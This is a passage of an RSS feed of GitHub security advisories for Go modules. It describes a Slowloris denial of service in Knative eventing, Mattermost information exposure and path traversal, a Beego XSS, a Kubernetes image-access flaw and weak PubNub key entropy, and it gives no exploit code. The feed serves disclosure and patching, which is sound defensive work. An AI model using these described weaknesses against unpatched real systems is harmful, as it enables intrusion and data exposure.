<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2023-12-10T15:01:14.661Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[knative.dev/eventing-gitlab] eventing-gitlab vulnerable to denial of service, caused by improper enforcement of the timeout on individual read operations]]></title>
        <id>https://github.com/advisories/GHSA-99jv-8292-2hpm</id>
        <link href="https://github.com/advisories/GHSA-99jv-8292-2hpm"/>
        <updated>2023-12-08T21:57:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The eventing-gitlab cluster-local server doesn't set <code>ReadHeaderTimeout</code>‬‭ which could lead do a DDoS‬ ‭attack, where a large group of users send requests to the server causing the server to hang‬ ‭for long enough to deny it from being available to other users, also know as a Slowloris‬ ‭attack.</p>
<h3 id="patches">Patches</h3>
<p>Fix in <code>v1.12.1</code> and <code>v1.11.3</code>.</p>
<h3 id="credits">Credits</h3>
<p>The vulnerability was reported by Ada Logics during an ongoing security audit of Knative involving Ada Logics, the Knative maintainers, OSTIF and CNCF.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/knative-extensions/eventing-gitlab/security/advisories/GHSA-99jv-8292-2hpm">https://github.com/knative-extensions/eventing-gitlab/security/advisories/GHSA-99jv-8292-2hpm</a></li>
<li><a href="https://github.com/knative-extensions/eventing-gitlab/commit/463fcb36ac31cdac34eda0e900b64039d6d30b36">https://github.com/knative-extensions/eventing-gitlab/commit/463fcb36ac31cdac34eda0e900b64039d6d30b36</a></li>
<li><a href="https://github.com/knative-extensions/eventing-gitlab/commit/db76c668aa47890e7fe73c9df3135da292cfd9ec">https://github.com/knative-extensions/eventing-gitlab/commit/db76c668aa47890e7fe73c9df3135da292cfd9ec</a></li>
<li><a href="https://github.com/advisories/GHSA-99jv-8292-2hpm">https://github.com/advisories/GHSA-99jv-8292-2hpm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-99jv-8292-2hpm</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-12-08T21:57:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Exposure of Sensitive Information to an Unauthorized Actor vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-63cv-4pc2-4fcf</id>
        <link href="https://github.com/advisories/GHSA-63cv-4pc2-4fcf"/>
        <updated>2023-12-08T21:57:15.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost is grouping calls in&nbsp;the /metrics endpoint by id and reports that id in the response. Since this id is the channelID, the public /metrics endpoint is revealing channelIDs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-6459">https://nvd.nist.gov/vuln/detail/CVE-2023-6459</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-63cv-4pc2-4fcf">https://github.com/advisories/GHSA-63cv-4pc2-4fcf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-63cv-4pc2-4fcf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-12-06T09:30:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost-server/v6] Mattermost Exposure of Sensitive Information to an Unauthorized Actor vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-63cv-4pc2-4fcf</id>
        <link href="https://github.com/advisories/GHSA-63cv-4pc2-4fcf"/>
        <updated>2023-12-08T21:57:15.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost is grouping calls in&nbsp;the /metrics endpoint by id and reports that id in the response. Since this id is the channelID, the public /metrics endpoint is revealing channelIDs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-6459">https://nvd.nist.gov/vuln/detail/CVE-2023-6459</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-63cv-4pc2-4fcf">https://github.com/advisories/GHSA-63cv-4pc2-4fcf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-63cv-4pc2-4fcf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-12-06T09:30:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v] Mattermost Injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-7664-hcp7-f497</id>
        <link href="https://github.com/advisories/GHSA-7664-hcp7-f497"/>
        <updated>2023-12-08T21:57:04.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost webapp fails to validate&nbsp;route parameters in//channels/&nbsp;allowing an attacker to perform a client-side path traversal.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-6458">https://nvd.nist.gov/vuln/detail/CVE-2023-6458</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-7664-hcp7-f497">https://github.com/advisories/GHSA-7664-hcp7-f497</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7664-hcp7-f497</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-12-06T09:30:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-7664-hcp7-f497</id>
        <link href="https://github.com/advisories/GHSA-7664-hcp7-f497"/>
        <updated>2023-12-08T21:57:04.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost webapp fails to validate&nbsp;route parameters in//channels/&nbsp;allowing an attacker to perform a client-side path traversal.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-6458">https://nvd.nist.gov/vuln/detail/CVE-2023-6458</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-7664-hcp7-f497">https://github.com/advisories/GHSA-7664-hcp7-f497</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7664-hcp7-f497</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-12-06T09:30:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-7664-hcp7-f497</id>
        <link href="https://github.com/advisories/GHSA-7664-hcp7-f497"/>
        <updated>2023-12-08T21:57:04.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost webapp fails to validate&nbsp;route parameters in//channels/&nbsp;allowing an attacker to perform a client-side path traversal.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-6458">https://nvd.nist.gov/vuln/detail/CVE-2023-6458</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-7664-hcp7-f497">https://github.com/advisories/GHSA-7664-hcp7-f497</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7664-hcp7-f497</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-12-06T09:30:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost-server/v6] Mattermost Injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-7664-hcp7-f497</id>
        <link href="https://github.com/advisories/GHSA-7664-hcp7-f497"/>
        <updated>2023-12-08T21:57:04.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost webapp fails to validate&nbsp;route parameters in//channels/&nbsp;allowing an attacker to perform a client-side path traversal.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-6458">https://nvd.nist.gov/vuln/detail/CVE-2023-6458</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-7664-hcp7-f497">https://github.com/advisories/GHSA-7664-hcp7-f497</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7664-hcp7-f497</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-12-06T09:30:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/beego/beego/v2] Cross-site Scripting in Beego]]></title>
        <id>https://github.com/advisories/GHSA-c77f-4rgj-jfr4</id>
        <link href="https://github.com/advisories/GHSA-c77f-4rgj-jfr4"/>
        <updated>2023-12-07T23:44:38.000Z</updated>
        <content type="html"><![CDATA[<p>Cross Site Scripting (XSS) vulnerability exists in the admin panel in Beego v2.0.1 via the URI path in an HTTP request, which is activated by administrators viewing the "Request Statistics" page.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-39391">https://nvd.nist.gov/vuln/detail/CVE-2021-39391</a></li>
<li><a href="https://github.com/beego/beego/issues/4727">https://github.com/beego/beego/issues/4727</a></li>
<li><a href="https://github.com/advisories/GHSA-c77f-4rgj-jfr4">https://github.com/advisories/GHSA-c77f-4rgj-jfr4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c77f-4rgj-jfr4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-09-15T20:23:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[k8s.io/kubernetes] Kubernetes in OpenShift3 Access Control Misconfiguration]]></title>
        <id>https://github.com/advisories/GHSA-2h9c-34v6-3qmr</id>
        <link href="https://github.com/advisories/GHSA-2h9c-34v6-3qmr"/>
        <updated>2023-12-07T21:16:23.000Z</updated>
        <content type="html"><![CDATA[<p>Kubernetes in OpenShift3 allows remote authenticated users to use the private images of other users should they know the name of said image.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2015-7561">https://nvd.nist.gov/vuln/detail/CVE-2015-7561</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/pull/18909">https://github.com/kubernetes/kubernetes/pull/18909</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1291963">https://bugzilla.redhat.com/show_bug.cgi?id=1291963</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/commit/e185b1028ac8459f7b451e1115399192e96f6ee9">https://github.com/kubernetes/kubernetes/commit/e185b1028ac8459f7b451e1115399192e96f6ee9</a></li>
<li><a href="https://github.com/advisories/GHSA-2h9c-34v6-3qmr">https://github.com/advisories/GHSA-2h9c-34v6-3qmr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2h9c-34v6-3qmr</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-05-13T01:09:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[knative.dev/eventing-github] eventing-github vulnerable to denial of service caused by improper enforcement of the timeout on individual read operations]]></title>
        <id>https://github.com/advisories/GHSA-v7hc-87jc-qrrr</id>
        <link href="https://github.com/advisories/GHSA-v7hc-87jc-qrrr"/>
        <updated>2023-12-06T19:19:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The eventing-github cluster-local server doesn't set <code>ReadHeaderTimeout</code>‬‭ which could lead do a DDoS‬ ‭attack, where a large group of users send requests to the server causing the server to hang‬ ‭for long enough to deny it from being available to other users, also know as a Slowloris‬ ‭attack.</p>
<h3 id="patches">Patches</h3>
<p>Fix in <code>v1.12.1</code> and <code>v1.11.3</code></p>
<h3 id="credits">Credits</h3>
<p>The vulnerability was reported by Ada Logics during an ongoing security audit of Knative involving Ada Logics, the Knative maintainers, OSTIF and CNCF.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/knative-extensions/eventing-github/security/advisories/GHSA-v7hc-87jc-qrrr">https://github.com/knative-extensions/eventing-github/security/advisories/GHSA-v7hc-87jc-qrrr</a></li>
<li><a href="https://github.com/knative-extensions/eventing-github/pull/442">https://github.com/knative-extensions/eventing-github/pull/442</a></li>
<li><a href="https://github.com/knative-extensions/eventing-github/pull/446">https://github.com/knative-extensions/eventing-github/pull/446</a></li>
<li><a href="https://github.com/knative-extensions/eventing-github/pull/447">https://github.com/knative-extensions/eventing-github/pull/447</a></li>
<li><a href="https://github.com/knative-extensions/eventing-github/commit/ea5cb8b25fc3410dde45ce2eb95454e4cfe77c40">https://github.com/knative-extensions/eventing-github/commit/ea5cb8b25fc3410dde45ce2eb95454e4cfe77c40</a></li>
<li><a href="https://github.com/advisories/GHSA-v7hc-87jc-qrrr">https://github.com/advisories/GHSA-v7hc-87jc-qrrr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v7hc-87jc-qrrr</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-12-06T19:19:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/pubnub/go/v5] pubnub Insufficient Entropy vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-5844-q3fc-56rh</id>
        <link href="https://github.com/advisories/GHSA-5844-q3fc-56rh"/>
        <updated>2023-12-07T23:04:34.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package pubnub before 7.4.0; all versions of the package com.pubnub:pubnub; versions of the package pubnub before 6.19.0; all versions of the package github.com/pubnub/go; versions of the package github.com/pubnub/go/v7 before 7.2.0; versions of the package pubnub before 7.3.0; versions of the package pubnub/pubnub before 6.1.0; versions of the package pubnub before 5.3.0; versions of the package pubnub before 0.4.0; versions of the package pubnub/c-core before 4.5.0; versions of the package com.pubnub:pubnub-kotlin before 7.7.0; versions of the package pubnub/swift before 6.2.0; versions of the package pubnub before 5.2.0; versions of the package pubnub before 4.3.0 are vulnerable to Insufficient Entropy via the getKey function, due to inefficient implementation of the AES-256-CBC cryptographic algorithm. The provided encrypt function is less secure when hex encoding and trimming are applied, leaving half of the bits in the key always the same for every encoded message or file.</p>
<p><strong>Note:</strong></p>
<p>In order to exploit this vulnerability, the attacker needs to invest resources in preparing the attack and brute-force the encryption.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-26154">https://nvd.nist.gov/vuln/detail/CVE-2023-26154</a></li>
<li><a href="https://github.com/pubnub/javascript/commit/fb6cd0417cbb4ba87ea2d5d86a9c94774447e119">https://github.com/pubnub/javascript/commit/fb6cd0417cbb4ba87ea2d5d86a9c94774447e119</a></li>
<li><a href="https://gist.github.com/vargad/20237094fce7a0a28f0723d7ce395bb0">https://gist.github.com/vargad/20237094fce7a0a28f0723d7ce395bb0</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-COCOAPODS-PUBNUB-6098384">https://security.snyk.io/vuln/SNYK-COCOAPODS-PUBNUB-6098384</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-DOTNET-PUBNUB-6098372">https://security.snyk.io/vuln/SNYK-DOTNET-PUBNUB-6098372</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMPUBNUBGO-6098373">https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMPUBNUBGO-6098373</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMPUBNUBGOV7-6098374">https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMPUBNUBGOV7-6098374</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JAVA-COMPUBNUB-6098371">https://security.snyk.io/vuln/SNYK-JAVA-COMPUBNUB-6098371</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JAVA-COMPUBNUB-6098380">https://security.snyk.io/vuln/SNYK-JAVA-COMPUBNUB-6098380</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-PUBNUB-5840690">https://security.snyk.io/vuln/SNYK-JS-PUBNUB-5840690</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PHP-PUBNUBPUBNUB-6098376">https://security.snyk.io/vuln/SNYK-PHP-PUBNUBPUBNUB-6098376</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PUB-PUBNUB-6098385">https://security.snyk.io/vuln/SNYK-PUB-PUBNUB-6098385</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PYTHON-PUBNUB-6098375">https://security.snyk.io/vuln/SNYK-PYTHON-PUBNUB-6098375</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-RUBY-PUBNUB-6098377">https://security.snyk.io/vuln/SNYK-RUBY-PUBNUB-6098377</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-RUST-PUBNUB-6098378">https://security.snyk.io/vuln/SNYK-RUST-PUBNUB-6098378</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-SWIFT-PUBNUBSWIFT-6098381">https://security.snyk.io/vuln/SNYK-SWIFT-PUBNUBSWIFT-6098381</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-UNMANAGED-PUBNUBCCORE-6098379">https://security.snyk.io/vuln/SNYK-UNMANAGED-PUBNUBCCORE-6098379</a></li>
<li><a href="https://github.com/pubnub/javascript/blob/master/src/crypto/modules/web.js#L70">https://github.com/pubnub/javascript/blob/master/src/crypto/modules/web.js#L70</a></li>
<li><a href="https://github.com/advisories/GHSA-5844-q3fc-56rh">https://github.com/advisories/GHSA-5844-q3fc-56rh</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/pubnub/CVE-2023-26154.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/pubnub/CVE-2023-26154.yml</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5844-q3fc-56rh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-12-06T06:30:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/pubnub/go/v6] pubnub Insufficient Entropy vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-5844-q3fc-56rh</id>
        <link href="https://github.com/advisories/GHSA-5844-q3fc-56rh"/>
        <updated>2023-12-07T23:04:34.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package pubnub before 7.4.0; all versions of the package com.pubnub:pubnub; versions of the package pubnub before 6.19.0; all versions of the package github.com/pubnub/go; versions of the package github.com/pubnub/go/v7 before 7.2.0; versions of the package pubnub before 7.3.0; versions of the package pubnub/pubnub before 6.1.0; versions of the package pubnub before 5.3.0; versions of the package pubnub before 0.4.0; versions of the package pubnub/c-core before 4.5.0; versions of the package com.pubnub:pubnub-kotlin before 7.7.0; versions of the package pubnub/swift before 6.2.0; versions of the package pubnub before 5.2.0; versions of the package pubnub before 4.3.0 are vulnerable to Insufficient Entropy via the getKey function, due to inefficient implementation of the AES-256-CBC cryptographic algorithm. The provided encrypt function is less secure when hex encoding and trimming are applied, leaving half of the bits in the key always the same for every encoded message or file.</p>
<p><strong>Note:</strong></p>
<p>In order to exploit this vulnerability, the attacker needs to invest resources in preparing the attack and brute-force the encryption.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-26154">https://nvd.nist.gov/vuln/detail/CVE-2023-26154</a></li>
<li><a href="https://github.com/pubnub/javascript/commit/fb6cd0417cbb4ba87ea2d5d86a9c94774447e119">https://github.com/pubnub/javascript/commit/fb6cd0417cbb4ba87ea2d5d86a9c94774447e119</a></li>
<li><a href="https://gist.github.com/vargad/20237094fce7a0a28f0723d7ce395bb0">https://gist.github.com/vargad/20237094fce7a0a28f0723d7ce395bb0</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-COCOAPODS-PUBNUB-6098384">https://security.snyk.io/vuln/SNYK-COCOAPODS-PUBNUB-6098384</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-DOTNET-PUBNUB-6098372">https://security.snyk.io/vuln/SNYK-DOTNET-PUBNUB-6098372</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMPUBNUBGO-6098373">https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMPUBNUBGO-6098373</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMPUBNUBGOV7-6098374">https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMPUBNUBGOV7-6098374</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JAVA-COMPUBNUB-6098371">https://security.snyk.io/vuln/SNYK-JAVA-COMPUBNUB-6098371</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JAVA-COMPUBNUB-6098380">https://security.snyk.io/vuln/SNYK-JAVA-COMPUBNUB-6098380</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-PUBNUB-5840690">https://security.snyk.io/vuln/SNYK-JS-PUBNUB-5840690</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PHP-PUBNUBPUBNUB-6098376">https://security.snyk.io/vuln/SNYK-PHP-PUBNUBPUBNUB-6098376</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PUB-PUBNUB-6098385">https://security.snyk.io/vuln/SNYK-PUB-PUBNUB-6098385</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PYTHON-PUBNUB-6098375">https://security.snyk.io/vuln/SNYK-PYTHON-PUBNUB-6098375</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-RUBY-PUBNUB-6098377">https://security.snyk.io/vuln/SNYK-RUBY-PUBNUB-6098377</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-RUST-PUBNUB-6098378">https://security.snyk.io/vuln/SNYK-RUST-PUBNUB-6098378</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-SWIFT-PUBNUBSWIFT-6098381">https://security.snyk.io/vuln/SNYK-SWIFT-PUBNUBSWIFT-6098381</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-UNMANAGED-PUBNUBCCORE-6098379">https://security.snyk.io/vuln/SNYK-UNMANAGED-PUBNUBCCORE-6098379</a></li>
<li><a href="https://github.com/pubnub/javascript/blob/master/src/crypto/modules/web.js#L70">https://github.com/pubnub/javascript/blob/master/src/crypto/modules/web.js#L70</a></li>
<li><a href="https://github.com/advisories/GHSA-5844-q3fc-56rh">https://github.com/advisories/GHSA-5844-q3fc-56rh</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/pubnub/CVE-2023-26154.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/pubnub/CVE-2023-26154.yml</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5844-q3fc-56rh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-12-06T06:30:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/pubnub/go] pubnub Insufficient Entropy vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-5844-q3fc-56rh</id>
        <link href="https://github.com/advisories/GHSA-5844-q3fc-56rh"/>
        <updated>2023-12-07T23:04:34.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package pubnub before 7.4.0; all versions of the package com.pubnub:pubnub; versions of the package pubnub before 6.19.0; all versions of the package github.com/pubnub/go; versions of the package github.com/pubnub/go/v7 before 7.2.0; versions of the package pubnub before 7.3.0; versions of the package pubnub/pubnub before 6.1.0; versions of the package pubnub before 5.3.0; versions of the package pubnub before 0.4.0; versions of the package pubnub/c-core before 4.5.0; versions of the package com.pubnub:pubnub-kotlin before 7.7.0; versions of the package pubnub/swift before 6.2.0; versions of the package pubnub before 5.2.0; versions of the package pubnub before 4.3.0 are vulnerable to Insufficient Entropy via the getKey function, due to inefficient implementation of the AES-256-CBC cryptographic algorithm. The provided encrypt function is less secure when hex encoding and trimming are applied, leaving half of the bits in the key always the same for every encoded message or file.</p>
<p><strong>Note:</strong></p>
<p>In order to exploit this vulnerability, the attacker needs to invest resources in preparing the attack and brute-force the encryption.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-26154">https://nvd.nist.gov/vuln/detail/CVE-2023-26154</a></li>
<li><a href="https://github.com/pubnub/javascript/commit/fb6cd0417cbb4ba87ea2d5d86a9c94774447e119">https://github.com/pubnub/javascript/commit/fb6cd0417cbb4ba87ea2d5d86a9c94774447e119</a></li>
<li><a href="https://gist.github.com/vargad/20237094fce7a0a28f0723d7ce395bb0">https://gist.github.com/vargad/20237094fce7a0a28f0723d7ce395bb0</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-COCOAPODS-PUBNUB-6098384">https://security.snyk.io/vuln/SNYK-COCOAPODS-PUBNUB-6098384</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-DOTNET-PUBNUB-6098372">https://security.snyk.io/vuln/SNYK-DOTNET-PUBNUB-6098372</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMPUBNUBGO-6098373">https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMPUBNUBGO-6098373</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMPUBNUBGOV7-6098374">https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMPUBNUBGOV7-6098374</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JAVA-COMPUBNUB-6098371">https://security.snyk.io/vuln/SNYK-JAVA-COMPUBNUB-6098371</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JAVA-COMPUBNUB-6098380">https://security.snyk.io/vuln/SNYK-JAVA-COMPUBNUB-6098380</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-PUBNUB-5840690">https://security.snyk.io/vuln/SNYK-JS-PUBNUB-5840690</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PHP-PUBNUBPUBNUB-6098376">https://security.snyk.io/vuln/SNYK-PHP-PUBNUBPUBNUB-6098376</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PUB-PUBNUB-6098385">https://security.snyk.io/vuln/SNYK-PUB-PUBNUB-6098385</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PYTHON-PUBNUB-6098375">https://security.snyk.io/vuln/SNYK-PYTHON-PUBNUB-6098375</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-RUBY-PUBNUB-6098377">https://security.snyk.io/vuln/SNYK-RUBY-PUBNUB-6098377</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-RUST-PUBNUB-6098378">https://security.snyk.io/vuln/SNYK-RUST-PUBNUB-6098378</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-SWIFT-PUBNUBSWIFT-6098381">https://security.snyk.io/vuln/SNYK-SWIFT-PUBNUBSWIFT-6098381</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-UNMANAGED-PUBNUBCCORE-6098379">https://security.snyk.io/vuln/SNYK-UNMANAGED-PUBNUBCCORE-6098379</a></li>
<li><a href="https://github.com/pubnub/javascript/blob/master/src/crypto/modules/web.js#L70">https://github.com/pubnub/javascript/blob/master/src/crypto/modules/web.js#L70</a></li>
<li><a href="https://github.com/advisories/GHSA-5844-q3fc-56rh">https://github.com/advisories/GHSA-5844-q3fc-56rh</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/pubnub/CVE-2023-26154.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/pubnub/CVE-2023-26154.yml</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5844-q3fc-56rh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-12-06T06:30:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/pubnub/go/v7] pubnub Insufficient Entropy vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-5844-q3fc-56rh</id>
        <link href="https://github.com/advisories/GHSA-5844-q3fc-56rh"/>
        <updated>2023-12-07T23:04:34.000Z</updated>
